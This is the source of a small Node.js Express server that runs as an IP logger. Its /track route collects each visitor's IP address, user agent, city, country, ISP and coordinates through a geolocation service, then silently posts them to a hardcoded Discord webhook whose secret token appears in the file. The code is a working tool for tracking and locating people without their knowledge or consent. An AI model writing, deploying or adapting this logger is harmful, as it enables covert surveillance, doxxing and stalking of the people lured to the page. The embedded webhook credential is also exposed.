import express from "express";
import fetch from "node-fetch";

const app = express();
const PORT = process.env.PORT || 3000;

const WEBHOOK_URL = "https://discord.com/api/webhooks/1511274000641167400/K-dYT4j9-0dWuvQJ4yKMLR7PWiTEXQ7FpXQSxoFN8pEtER5yyVHpGxvPb0SLkEy4uqMO";

app.set("trust proxy", true);

// Serve index.html
app.get("/", (req, res) => {
    res.sendFile("index.html", { root: process.cwd() });
});

// TRACK ROUTE
app.get("/track", async (req, res) => {

    // =========================
    // 1. GET REAL IP
    // =========================
    const rawIp =
        req.headers["x-forwarded-for"] ||
        req.socket.remoteAddress ||
        "";

    let ip = rawIp.split(",")[0].trim();

    // Clean IPv6-mapped IPv4
    ip = ip.replace("::ffff:", "");

    const userAgent = req.headers["user-agent"] || "Unknown";

    // Detect IP type
    const isIPv6 = ip.includes(":");
    const isIPv4 = ip.includes(".");

    // =========================
    // 2. GEO LOOKUP
    // =========================
    let city = "Unknown";
    let country = "Unknown";
    let isp = "Unknown";
    let org = "Unknown";
    let latitude = "";
    let longitude = "";

    const isLocal =
        ip === "::1" ||
        ip === "127.0.0.1" ||
        ip.startsWith("192.168.") ||
        ip.startsWith("10.") ||
        ip.startsWith("172.");

    if (!isLocal && ip) {
        try {
            const geoRes = await fetch(`https://ipwho.is/${ip}`);
            const data = await geoRes.json();

            if (data.success) {
                city = data.city || "Unknown";
                country = data.country || "Unknown";
                isp = data.connection?.isp || "Unknown";
                org = data.connection?.org || "Unknown";
                latitude = data.latitude || "";
                longitude = data.longitude || "";
            }
        } catch (err) {
            console.error("Geo lookup failed:", err);
        }
    } else {
        city = "Local Network";
        country = "Local";
    }

    // =========================
    // 3. BUILD DISCORD MESSAGE
    // =========================
    const message = `
🇵🇭 New Visitor Logged

🌍 IP: ${ip}
📶 Type: ${isIPv4 ? "IPv4" : isIPv6 ? "IPv6" : "Unknown"}

📍 Location: ${city}, ${country}
🏢 ISP: ${isp}
🏢 Org: ${org}

📡 Coordinates: ${latitude || "N/A"}, ${longitude || "N/A"}

🖥️ Device: ${userAgent}
`;

    // =========================
    // 4. SEND TO DISCORD
    // =========================
    try {
        await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: message })
        });
    } catch (err) {
        console.error("Webhook failed:", err);
    }

    res.sendStatus(200);
});

// START SERVER
app.listen(PORT, () => {
    console.log("Server running on port " + PORT);
});
